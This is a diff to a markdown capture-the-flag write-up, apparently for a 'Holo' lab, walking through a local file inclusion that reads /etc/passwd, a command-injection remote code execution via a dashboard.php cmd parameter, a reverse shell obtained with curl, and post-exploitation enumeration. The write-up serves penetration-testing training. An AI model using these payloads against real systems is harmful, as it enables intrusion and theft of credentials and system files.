@@ -1029,7 +1029,7 @@ Source for talent page of dev.holo.live:
 
 Looking at the source for talent page of dev.holo.live, we have notice there is a possibly of Local File Inclusion vulnerability --- ` img.php?file= `.
 
-Let's try out --- the payload we used ` http://dev.holo.live/img.php?file=../../../etc/passwd `:
+Let's try out --- the payload we used -> ` http://dev.holo.live/img.php?file=../../../etc/passwd `:
 
 ![lfi-img.php-dev.holo.live](lfi-img.php-dev.holo.live.png)
 
@@ -1043,7 +1043,7 @@ Now we get a credentials, let's try to login to admin.holo.live:
 
 Once we login, we check on the source of dashboard.php, right away we notice there is PHP Rmote Code Execution ([OWASP Command Injection](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection)) under the comment for "visitor visted today" --- ` <!-- //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->" `
 
-Let's try out --- the payload we used ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `:
+Let's try out --- the payload we used -> ` http://admin.holo.live/dashboard.php?cmd=ls+-la%20&&%20echo%20%22%22 `:
 
 ![rce-1-dashboard.php-admin.holo.live](rce-1-dashboard.php-admin.holo.live.png)
 
@@ -1056,6 +1056,217 @@ We are using curl to perform this exploit to get our reverse shell -> ` curl htt
 Reverse shell - called back from admin.holo.live:
 
 ![reverse-shell-admin.holo.live](reverse-shell-admin.holo.live.png)
+
+Enumeration directories on target system:
+
+![enumerate-system-1-admin.holo.live.png](enumerate-system-1-admin.holo.live.png)
+
+We found db_connect.php:
+
+![db_connect.php-admin.holo.live](db_connect.php-admin.holo.live.png)
+
+User.txt:
+
+![user.txt-1-admin.holo.live](user.txt-1-admin.holo.live.png)
+
+![user.txt-2-admin.holo.live](user.txt-2-admin.holo.live.png)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
